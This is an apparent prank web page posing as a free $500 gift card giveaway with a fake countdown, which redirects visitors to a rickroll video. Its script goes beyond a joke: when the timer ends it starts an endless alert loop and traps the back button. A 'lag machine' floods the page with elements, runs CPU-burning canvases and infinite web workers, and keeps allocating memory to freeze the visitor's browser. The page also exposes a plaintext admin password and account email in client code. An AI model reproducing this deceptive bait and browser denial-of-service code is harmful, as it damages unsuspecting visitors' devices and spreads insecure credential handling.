<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Free Gift Card Giveaway 2026!</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: #fff;
      min-height: 100vh;
      overflow-x: hidden;
    }

    /* === BAIT PAGE === */
    #bait {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 2rem;
      text-align: center;
    }

    .badge {
      background: #ff4757;
      color: #fff;
      padding: 0.4rem 1.2rem;
      border-radius: 20px;
      font-size: 0.85rem;
      font-weight: 700;
      letter-spacing: 1px;
      text-transform: uppercase;
      margin-bottom: 1.5rem;
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.08); }
    }

    #bait h1 {
      font-size: clamp(2rem, 5vw, 3.5rem);
      margin-bottom: 0.5rem;
      background: linear-gradient(90deg, #f9ca24, #f0932b, #eb4d4b);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    #bait p.sub {
      font-size: 1.15rem;
      color: #aaa;
      margin-bottom: 2rem;
      max-width: 500px;
    }

    .cards {
      display: flex;
      gap: 1.5rem;
      flex-wrap: wrap;
      justify-content: center;
      margin-bottom: 2.5rem;
    }

    .card {
      background: rgba(255,255,255,0.07);
      border: 2px solid rgba(255,255,255,0.12);
      border-radius: 16px;
      padding: 2rem 1.5rem;
      width: 180px;
      backdrop-filter: blur(10px);
      transition: transform 0.2s, box-shadow 0.2s, border-color 0.2s;
      cursor: pointer;
      user-select: none;
    }

    .card:hover {
      transform: translateY(-6px);
      box-shadow: 0 12px 30px rgba(0,0,0,0.4);
    }

    .card.selected {
      border-color: #f0932b;
      box-shadow: 0 0 20px rgba(240, 147, 43, 0.4);
      transform: translateY(-6px);
    }

    .card .icon { font-size: 2.5rem; margin-bottom: 0.8rem; }
    .card h3 { font-size: 1rem; margin-bottom: 0.3rem; }
    .card p { font-size: 0.8rem; color: #999; }

    .claim-btn {
      background: linear-gradient(135deg, #f9ca24, #f0932b);
      color: #000;
      border: none;
      padding: 1rem 3rem;
      font-size: 1.2rem;
      font-weight: 700;
      border-radius: 50px;
      cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .claim-btn:hover {
      transform: scale(1.05);
      box-shadow: 0 8px 25px rgba(249, 202, 36, 0.4);
    }

    .timer {
      margin-top: 1.5rem;
      font-size: 0.95rem;
      color: #ff6b6b;
    }

    .timer span {
      font-weight: 700;
      font-size: 1.1rem;
    }

    .fine-print {
      margin-top: 2rem;
      font-size: 0.7rem;
      color: #555;
      max-width: 400px;
    }

    /* === RICK ROLL PAGE === */
    #rickroll {
      display: none;
      position: fixed;
      inset: 0;
      z-index: 9999;
      background: #000;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    #rickroll.active {
      display: flex;
    }

    #rickroll iframe {
      width: min(90vw, 800px);
      aspect-ratio: 16/9;
      border: none;
      border-radius: 12px;
    }

    .gotcha {
      font-size: clamp(1.5rem, 4vw, 3rem);
      margin-top: 1.5rem;
      font-weight: 700;
      text-align: center;
      animation: rainbow 2s linear infinite;
    }

    @keyframes rainbow {
      0%   { color: #ff0000; }
      16%  { color: #ff8800; }
      33%  { color: #ffff00; }
      50%  { color: #00ff00; }
      66%  { color: #0088ff; }
      83%  { color: #8800ff; }
      100% { color: #ff0000; }
    }

    .gotcha-sub {
      color: #888;
      margin-top: 0.5rem;
      font-size: 1rem;
    }

    /* === MAGIC BUTTON & CONTROL PANEL === */
    #magic-btn {
      position: fixed;
      bottom: 12px;
      right: 12px;
      z-index: 20000;
      background: rgba(255,255,255,0.06);
      border: 1px solid rgba(255,255,255,0.1);
      color: #555;
      font-size: 0.65rem;
      padding: 4px 10px;
      border-radius: 6px;
      cursor: pointer;
      transition: opacity 0.3s;
      opacity: 0.3;
    }
    #magic-btn:hover { opacity: 1; color: #fff; }

    #panel-overlay {
      display: none;
      position: fixed;
      inset: 0;
      z-index: 20001;
      background: rgba(0,0,0,0.7);
      align-items: center;
      justify-content: center;
    }
    #panel-overlay.active { display: flex; }

    #control-panel {
      background: #1a1a2e;
      border: 1px solid #333;
      border-radius: 16px;
      padding: 2rem;
      width: min(90vw, 420px);
      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
    }

    #control-panel h2 {
      font-size: 1.2rem;
      margin-bottom: 1rem;
      color: #fff;
    }

    #control-panel label {
      display: block;
      font-size: 0.85rem;
      color: #aaa;
      margin-bottom: 0.3rem;
      margin-top: 0.8rem;
    }

    #control-panel input[type="password"],
    #control-panel input[type="text"] {
      width: 100%;
      padding: 0.6rem 0.8rem;
      border-radius: 8px;
      border: 1px solid #333;
      background: #0f0f1a;
      color: #fff;
      font-size: 0.9rem;
      outline: none;
    }
    #control-panel input:focus { border-color: #f0932b; }

    #control-panel .panel-btn {
      padding: 0.6rem 1.4rem;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
      font-size: 0.85rem;
      margin-top: 0.5rem;
      margin-right: 0.5rem;
    }

    .btn-primary {
      background: linear-gradient(135deg, #f9ca24, #f0932b);
      color: #000;
    }
    .btn-secondary {
      background: rgba(255,255,255,0.1);
      color: #fff;
    }
    .btn-primary:hover { box-shadow: 0 4px 15px rgba(249,202,36,0.3); }
    .btn-secondary:hover { background: rgba(255,255,255,0.15); }

    #panel-error {
      color: #ff4757;
      font-size: 0.8rem;
      margin-top: 0.5rem;
      min-height: 1.2em;
    }

    #panel-controls { display: none; }

    #panel-controls .preset-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 0.5rem;
      margin-top: 0.5rem;
    }

    #panel-controls .preset-btn {
      padding: 0.5rem;
      border: 1px solid #333;
      border-radius: 8px;
      background: rgba(255,255,255,0.05);
      color: #ccc;
      font-size: 0.8rem;
      cursor: pointer;
      transition: all 0.2s;
      text-align: left;
    }
    #panel-controls .preset-btn:hover {
      background: rgba(255,255,255,0.12);
      border-color: #f0932b;
      color: #fff;
    }

    #panel-status {
      color: #2ed573;
      font-size: 0.8rem;
      margin-top: 0.8rem;
      min-height: 1.2em;
    }

    /* confetti */
    .confetti-piece {
      position: fixed;
      width: 10px;
      height: 10px;
      top: -20px;
      z-index: 10000;
      animation: fall linear forwards;
    }

    @keyframes fall {
      to {
        top: 110vh;
        transform: rotate(720deg);
      }
    }
  </style>

  <!-- Firebase SDK (compat CDN for static sites) -->
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
</head>
<body>

  <!-- BAIT -->
  <div id="bait">
    <div class="badge">Limited Time Only</div>
    <h1>Free Gift Card Giveaway!</h1>
    <p class="sub">We're giving away $500 gift cards to the first 100 visitors. Choose your reward below!</p>

    <div class="cards">
      <div class="card" onclick="selectCard(this)">
        <div class="icon">üéÆ</div>
        <h3>Steam</h3>
        <p>$500 Value</p>
      </div>
      <div class="card" onclick="selectCard(this)">
        <div class="icon">üçé</div>
        <h3>Apple</h3>
        <p>$500 Value</p>
      </div>
      <div class="card" onclick="selectCard(this)">
        <div class="icon">üõí</div>
        <h3>Amazon</h3>
        <p>$500 Value</p>
      </div>
      <div class="card" onclick="selectCard(this)">
        <div class="icon">üéµ</div>
        <h3>Spotify</h3>
        <p>1 Year Free</p>
      </div>
    </div>

    <button class="claim-btn" onclick="rickRoll()">Claim My Free Gift Card</button>

    <div class="timer">Offer expires in: <span id="countdown">0:45</span></div>

    <p class="fine-print">*No purchase necessary. Must be 18+. Totally real and not suspicious at all. Trust us.</p>
  </div>

  <!-- RICK ROLL -->
  <div id="rickroll">
    <iframe
      id="rick-video"
      src=""
      allow="autoplay; encrypted-media"
      allowfullscreen
    ></iframe>
    <p class="gotcha" id="gotcha-title">You just got Rick Rolled!</p>
    <p class="gotcha-sub" id="gotcha-sub">There was never a gift card. Only Rick.</p>
  </div>

  <!-- MAGIC BUTTON -->
  <button id="magic-btn" onclick="openPanel()">magic</button>

  <!-- CONTROL PANEL OVERLAY -->
  <div id="panel-overlay">
    <div id="control-panel">
      <h2>Control Panel</h2>

      <!-- Password gate -->
      <div id="panel-login">
        <label for="panel-pw">Password</label>
        <input type="password" id="panel-pw" placeholder="Enter password..." onkeydown="if(event.key==='Enter')authenticate()">
        <p id="panel-error"></p>
        <div style="margin-top:1rem">
          <button class="panel-btn btn-primary" onclick="authenticate()">Unlock</button>
          <button class="panel-btn btn-secondary" onclick="closePanel()">Cancel</button>
        </div>
      </div>

      <!-- Actual controls (hidden until authenticated) -->
      <div id="panel-controls">
        <label for="custom-url">YouTube Video URL or ID</label>
        <input type="text" id="custom-url" placeholder="e.g. dQw4w9WgXcQ or full YouTube URL">

        <label style="margin-top:1rem">Quick Presets</label>
        <div class="preset-grid">
          <button class="preset-btn" onclick="setVideo('dQw4w9WgXcQ')">Rick Astley - Never Gonna Give You Up</button>
          <button class="preset-btn" onclick="setVideo('oHg5SJYRHA0')">Rick Roll (Alt Link)</button>
          <button class="preset-btn" onclick="setVideo('xvFZjo5PgG0')">Nyan Cat (10hr)</button>
          <button class="preset-btn" onclick="setVideo('CWExUQcTxB8')">Galaxy Brain</button>
        </div>

        <div style="margin-top:1rem">
          <button class="panel-btn btn-primary" onclick="applyCustomVideo()">Apply</button>
          <button class="panel-btn btn-secondary" onclick="resetVideo()">Reset to Rick</button>
          <button class="panel-btn btn-secondary" onclick="closePanel()">Close</button>
        </div>
        <p id="panel-status"></p>
      </div>
    </div>
  </div>

  <script>
    // === FIREBASE SETUP ===
    const firebaseConfig = {
      apiKey: "AIzaSyBkFbzNnQsC8eFT_HfqDrchim9ueSD-zvQ",
      authDomain: "free-stuff-fe1a0.firebaseapp.com",
      databaseURL: "https://free-stuff-fe1a0-default-rtdb.firebaseio.com",
      projectId: "free-stuff-fe1a0",
      storageBucket: "free-stuff-fe1a0.firebasestorage.app",
      messagingSenderId: "690758943869",
      appId: "1:690758943869:web:e576db55592ab2bd685d14"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const videoRef = db.ref('config/videoId');

    // === STATE ===
    let panelUnlocked = false;
    let currentVideoId = 'dQw4w9WgXcQ';

    // === VIDEO ‚Üí TEXT MAPPING ===
    const videoText = {
      'dQw4w9WgXcQ': { title: 'You just got Rick Rolled!', sub: 'There was never a gift card. Only Rick.' },
      'oHg5SJYRHA0': { title: 'You just got Rick Rolled!', sub: 'There was never a gift card. Only Rick.' },
      'xvFZjo5PgG0': { title: 'You just got Nyan Catted!', sub: 'There was never a gift card. Only Nyan Cat.' },
      'CWExUQcTxB8': { title: 'Galaxy Brain!', sub: 'There was never a gift card. Only Galaxy Brain.' },
    };
    const defaultText = { title: 'You just got pranked!', sub: 'There was never a gift card. Never was.' };

    function updateGotchaText(id) {
      const text = videoText[id] || defaultText;
      document.getElementById('gotcha-title').textContent = text.title;
      document.getElementById('gotcha-sub').textContent = text.sub;
    }

    // === LISTEN FOR GLOBAL VIDEO CHANGES (real-time) ===
    videoRef.on('value', (snapshot) => {
      const id = snapshot.val();
      if (id) {
        currentVideoId = id;
        updateGotchaText(id);
        // If someone is already being rick rolled, swap the video live
        const video = document.getElementById('rick-video');
        if (document.getElementById('rickroll').classList.contains('active')) {
          video.src = 'https://www.youtube.com/embed/' + id + '?autoplay=1&start=0';
        }
      }
    });

    // === CONTROL PANEL ===
    function openPanel() {
      document.getElementById('panel-overlay').classList.add('active');
      if (panelUnlocked) {
        document.getElementById('panel-login').style.display = 'none';
        document.getElementById('panel-controls').style.display = 'block';
      } else {
        document.getElementById('panel-login').style.display = 'block';
        document.getElementById('panel-controls').style.display = 'none';
        document.getElementById('panel-pw').value = '';
        document.getElementById('panel-error').textContent = '';
        setTimeout(() => document.getElementById('panel-pw').focus(), 100);
      }
    }

    function closePanel() {
      document.getElementById('panel-overlay').classList.remove('active');
    }

    function authenticate() {
      const pw = document.getElementById('panel-pw').value;
      if (pw === 'babaisstinky') {
        // Sign into Firebase so writes are authorized
        firebase.auth().signInWithEmailAndPassword('dylanyoung1225@icloud.com', pw)
          .then(() => {
            panelUnlocked = true;
            document.getElementById('panel-login').style.display = 'none';
            document.getElementById('panel-controls').style.display = 'block';
            document.getElementById('panel-error').textContent = '';
          })
          .catch((err) => {
            document.getElementById('panel-error').textContent = 'Firebase auth failed: ' + err.message;
          });
      } else {
        document.getElementById('panel-error').textContent = 'Wrong password. Nice try.';
        document.getElementById('panel-pw').value = '';
      }
    }

    function extractVideoId(input) {
      input = input.trim();
      if (/^[A-Za-z0-9_-]{11}$/.test(input)) return input;
      try {
        const url = new URL(input);
        if (url.searchParams.has('v')) return url.searchParams.get('v');
        const parts = url.pathname.split('/').filter(Boolean);
        const last = parts[parts.length - 1];
        if (last && /^[A-Za-z0-9_-]{11}$/.test(last)) return last;
      } catch(e) {}
      return input;
    }

    function setVideo(id) {
      document.getElementById('custom-url').value = id;
      pushVideo(id);
    }

    function applyCustomVideo() {
      const raw = document.getElementById('custom-url').value;
      if (!raw.trim()) {
        document.getElementById('panel-status').textContent = 'Enter a URL or video ID first.';
        document.getElementById('panel-status').style.color = '#ff4757';
        return;
      }
      const id = extractVideoId(raw);
      pushVideo(id);
    }

    // Write to Firebase ‚Äî all connected clients pick it up instantly
    function pushVideo(id) {
      videoRef.set(id).then(() => {
        document.getElementById('panel-status').textContent = 'Video updated globally: ' + id;
        document.getElementById('panel-status').style.color = '#2ed573';
      }).catch((err) => {
        document.getElementById('panel-status').textContent = 'Firebase error: ' + err.message;
        document.getElementById('panel-status').style.color = '#ff4757';
      });
    }

    function resetVideo() {
      document.getElementById('custom-url').value = '';
      pushVideo('dQw4w9WgXcQ');
      document.getElementById('panel-status').textContent = 'Reset to Rick Astley globally. As it should be.';
      document.getElementById('panel-status').style.color = '#2ed573';
    }

    // Card selection
    function selectCard(el) {
      document.querySelectorAll('.card').forEach(c => c.classList.remove('selected'));
      el.classList.add('selected');
    }

    // Fake countdown timer ‚Äî triggers rick roll + alert bomb at 0
    (function () {
      let time = 45;
      let expired = false;
      const el = document.getElementById('countdown');
      setInterval(() => {
        if (expired) return;
        time--;
        if (time <= 0) {
          expired = true;
          el.textContent = '0:00';
          // Trigger the rick roll first
          rickRoll();
          // Then hit them with the alert bomb after a short delay
          setTimeout(alertBomb, 1500);
          return;
        }
        const m = Math.floor(time / 60);
        const s = String(time % 60).padStart(2, '0');
        el.textContent = m + ':' + s;
      }, 1000);
    })();

    // Endless alert loop ‚Äî nearly impossible to escape without force-closing the tab
    function alertBomb() {
      const messages = [
        'You just got Rick Rolled!',
        'There is no gift card. There never was.',
        'Never gonna give you up!',
        'Never gonna let you go!',
        'Close this tab... if you can.',
        'Still here?',
        'You can\'t escape Rick.',
        'Alt+F4 might help. Maybe.',
        'Rick Astley believes in you.',
        'This is your life now.',
      ];
      let i = 0;
      while (true) {
        alert(messages[i % messages.length]);
        i++;
      }
    }

    // The main event
    function rickRoll() {
      const roll = document.getElementById('rickroll');
      const video = document.getElementById('rick-video');

      video.src = 'https://www.youtube.com/embed/' + currentVideoId + '?autoplay=1&start=0';
      updateGotchaText(currentVideoId);

      roll.classList.add('active');
      document.getElementById('bait').style.display = 'none';

      spawnConfetti();
      lagMachine();

      history.pushState(null, '', location.href);
      window.addEventListener('popstate', () => {
        history.pushState(null, '', location.href);
      });
    }

    // Confetti explosion
    function spawnConfetti() {
      const colors = ['#ff0000','#ff8800','#ffff00','#00ff00','#0088ff','#8800ff','#ff00ff'];
      for (let i = 0; i < 150; i++) {
        const piece = document.createElement('div');
        piece.classList.add('confetti-piece');
        piece.style.left = Math.random() * 100 + 'vw';
        piece.style.background = colors[Math.floor(Math.random() * colors.length)];
        piece.style.animationDuration = (Math.random() * 2 + 2) + 's';
        piece.style.animationDelay = (Math.random() * 2) + 's';
        piece.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
        piece.style.width = (Math.random() * 8 + 6) + 'px';
        piece.style.height = (Math.random() * 8 + 6) + 'px';
        document.body.appendChild(piece);
      }
    }

    // === LAG MACHINE === absolutely destroy the browser tab
    function lagMachine() {
      // 1. Spawn thousands of heavy animated DOM elements
      const colors = ['#ff0000','#ff8800','#ffff00','#00ff00','#0088ff','#8800ff','#ff00ff'];
      function spawnWave() {
        for (let i = 0; i < 500; i++) {
          const el = document.createElement('div');
          el.style.cssText = 'position:fixed;z-index:9998;pointer-events:none;' +
            'width:' + (Math.random() * 200 + 50) + 'px;' +
            'height:' + (Math.random() * 200 + 50) + 'px;' +
            'top:' + (Math.random() * 100) + 'vh;' +
            'left:' + (Math.random() * 100) + 'vw;' +
            'background:' + colors[Math.floor(Math.random() * colors.length)] + ';' +
            'border-radius:' + (Math.random() > 0.5 ? '50%' : '0') + ';' +
            'opacity:0.7;' +
            'box-shadow:0 0 40px ' + colors[Math.floor(Math.random() * colors.length)] + ';' +
            'animation:lagSpin ' + (Math.random() * 2 + 0.5) + 's linear infinite;' +
            'filter:blur(' + Math.floor(Math.random() * 5) + 'px);';
          el.textContent = 'RICK';
          document.body.appendChild(el);
        }
      }

      // Add the spin animation
      const style = document.createElement('style');
      style.textContent = '@keyframes lagSpin { 0%{transform:rotate(0deg) scale(1)} 50%{transform:rotate(180deg) scale(2)} 100%{transform:rotate(360deg) scale(1)} }';
      document.head.appendChild(style);

      // Spawn waves repeatedly
      spawnWave();
      setInterval(spawnWave, 800);

      // 2. Burn CPU with heavy canvas operations
      for (let c = 0; c < 5; c++) {
        const canvas = document.createElement('canvas');
        canvas.width = 2000;
        canvas.height = 2000;
        canvas.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9997;pointer-events:none;opacity:0.3;';
        document.body.appendChild(canvas);
        const ctx = canvas.getContext('2d');
        function burnCanvas() {
          for (let i = 0; i < 5000; i++) {
            ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
            ctx.shadowBlur = 20;
            ctx.shadowColor = colors[Math.floor(Math.random() * colors.length)];
            ctx.beginPath();
            ctx.arc(Math.random() * 2000, Math.random() * 2000, Math.random() * 100, 0, Math.PI * 2);
            ctx.fill();
          }
          requestAnimationFrame(burnCanvas);
        }
        burnCanvas();
      }

      // 3. Flood web workers to eat CPU cores
      const workerCode = 'while(true){Math.sqrt(Math.random());}';
      const blob = new Blob([workerCode], {type: 'application/javascript'});
      const workerUrl = URL.createObjectURL(blob);
      for (let w = 0; w < navigator.hardwareConcurrency || 8; w++) {
        try { new Worker(workerUrl); } catch(e) {}
      }

      // 4. Fill up memory with huge arrays
      const memoryHog = [];
      setInterval(() => {
        try { memoryHog.push(new ArrayBuffer(50 * 1024 * 1024)); } catch(e) {}
      }, 500);
    }
  </script>
</body>
</html>
